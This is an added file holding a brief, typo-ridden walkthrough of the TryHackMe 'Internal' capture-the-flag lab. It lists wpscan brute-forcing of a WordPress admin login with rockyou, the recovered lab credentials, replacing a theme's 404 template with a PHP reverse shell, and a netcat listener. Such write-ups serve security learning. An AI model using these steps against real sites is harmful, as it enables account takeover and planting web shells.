@@ -1,0 +1,35 @@
+Internal Lab on TryHackMe
+===================================================================================================================================================
+Defficulty : Hard
+
+
+steps:
+ 1- Put the target ip in the hosts file
+  command: sudo nano /etc/hosts
+    and put the ip in the file --> <target_ip> internal.thm 
+ 2- use dirsearch to show the important files
+   command: dirsearch -u http://internal.thm
+ 3- use wpscan to access on the files with extention .php and know the password by doing a brute force attack 
+   command: wpscan --url http://internal.thm/blog/ --usernames admin --passwords rockyou.txt max-threads 50 
+  Get	username: amdin
+ 	password: my2boys
+ 4- Login the wordpress page and enter wpscan website
+ 5- Go to  "Appearance" —> "Theme editor" —> 404 Template
+ 6- Udate the code in the page by the code in file file.php (found here : https://github.com/pentestmonkey/php-reverse-shell ) and save changes
+   and this code to a remote code excution
+ 7- To listen the changes in the page I can use this command: nc -nlvp 53
+
+
+
+Resources
+===================================================================================================================================================
+Search content: internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+===================================================================================================================================================
+https://medium.com/@jovanski.wisuda/internal-tryhackme-walkthrough-ba21ba2b2ca
+https://systemweakness.com/internal-tryhackme-c2c1939b7c92
+https://anugrahsr.github.io/posts/THM-Internal/
+
+
+
+
+ 
